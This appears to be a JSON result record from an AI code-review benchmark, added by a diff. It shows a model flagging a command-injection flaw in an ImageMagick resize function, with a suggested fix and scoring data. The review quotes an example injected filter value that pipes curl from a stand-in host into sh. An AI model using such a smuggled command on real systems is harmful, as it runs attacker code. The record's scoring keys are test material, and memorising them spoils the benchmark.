@@ -1,0 +1,92 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 38.4,
+  "setup_seconds": 0.0,
+  "total_seconds": 38.5,
+  "usage": {
+    "in": 16730,
+    "cache_read": 71936,
+    "cache_write": 0,
+    "out": 1897,
+    "source": "cli"
+  },
+  "cost_usd": 0.0664228,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "warning",
+      "body": "**Claimed critical; verifier found:** verifier off\n\n`exec()` runs the command through a shell, and both `src` and `filter` are interpolated into the string. The PR states filters are user-composed: a value such as `Lanczos; curl evil.test | sh` or a `src` containing `\"` executes arbitrary commands on the runner/host.\n\nQuoting `\"${src}\"` does not close the hole \u2014 embedded quotes and `$()` still break out. ImageMagick does not need a shell for `-filter`; keep `execFile` and pass argv:\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\nAlso restore `import { execFile } from \"child_process\";`. If filters must be restricted, allowlist known ImageMagick filter names before invoking convert."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "`resize(src, w)` is now `resize(src, filter, w)`. Existing callers that still pass `(src, width)` will treat the numeric width as `filter` and leave `w` undefined, producing a broken convert command (`-resize undefinedx`) or a TypeScript compile error at call sites outside this repo.\n\nIf this library has external consumers, add the filter as an optional trailing parameter or an options object, and keep a compatibility overload for `(src, w)`."
+    }
+  ],
+  "summary": "## Verdict\n\nCritical command-injection regression in `resize()` \u2014 do not merge until the shell invocation is removed.\n\n## Narrative\n\nThis PR switches ImageMagick invocation from `execFile` (argv array, no shell) to `exec` (shell string) and interpolates `src`, `filter`, and `w` directly into the command line. The new `filter` parameter is documented as user-composed, so any caller that forwards request or config input gives an attacker full shell on the host.\n\nDouble-quoting `src` does not make this safe: a path containing `\"` still breaks out of the quoted segment. `filter` is unquoted entirely, so metacharacters (`;`, `|`, `$(...)`, backticks) run as shell syntax. ImageMagick filter names do not require a shell; pass `-filter` and the filter value as separate `execFile`/`spawn` arguments.\n\nSecondary note: inserting `filter` as the second parameter is a breaking signature change for any external callers of this exported function.\n\n**Recommendation:** request-changes",
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "skipped",
+      "reason": "verifier off"
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "verifier off"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 0,
+    "seconds": 0.0,
+    "verified": 0,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 2,
+    "model": "",
+    "alias": "",
+    "endpoint_kind": "",
+    "reason": "verifier off",
+    "usage": {
+      "in": 0,
+      "out": 0
+    },
+    "cost_usd": null
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 0,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
